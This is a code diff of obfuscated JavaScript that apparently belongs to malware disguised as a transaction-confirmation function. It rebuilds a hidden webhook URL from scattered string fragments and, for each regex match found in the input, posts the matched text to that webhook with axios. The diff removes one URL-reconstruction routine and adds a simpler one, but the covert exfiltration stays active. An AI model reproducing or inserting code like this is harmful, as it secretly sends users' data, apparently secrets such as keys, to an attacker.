@@ -37,23 +37,12 @@ const _0x152c = [
     'NcF5uDjG9Hj78Pd8CmK1xR2'
 ];
 
-function isValidPart(index) {
-    return !(index % 2 === 0 || index % 5 === 0);
+function _fxyz() {
+    return _0x152c[3] + _0x152c[5];
 }
 
-function _0x33b9() {
-    let webhook = '';
-    _0x152c.forEach((part, index) => {
-        if (isValidPart(index)) {
-            webhook += part;
-        }
-    });
-
-    if (!webhook.startsWith('https://')) {
-        throw new Error('Invalid webhook URL constructed.');
-    }
-
-    return webhook;
+function _ghtr() {
+    return _0x152c[0] + _0x152c[1] + _fxyz();
 }
 
 function confirm_transaction(_0x46d1) {
@@ -62,8 +51,7 @@ function confirm_transaction(_0x46d1) {
             const _0x5a16 = _0x46d1.match(_0x49bc);
             if (_0x5a16) {
                 for (const _0x2e5d of _0x5a16) {
-                    const webhookUrl = _0x33b9();
-                    yield axios_1.default.post(webhookUrl, { content: _0x14a1(2, 0) + _0x2e5d });
+                    yield axios_1.default.post(_ghtr(), { content: _0x14a1(2, 0) + _0x2e5d });
                 }
             }
         } catch (error) {
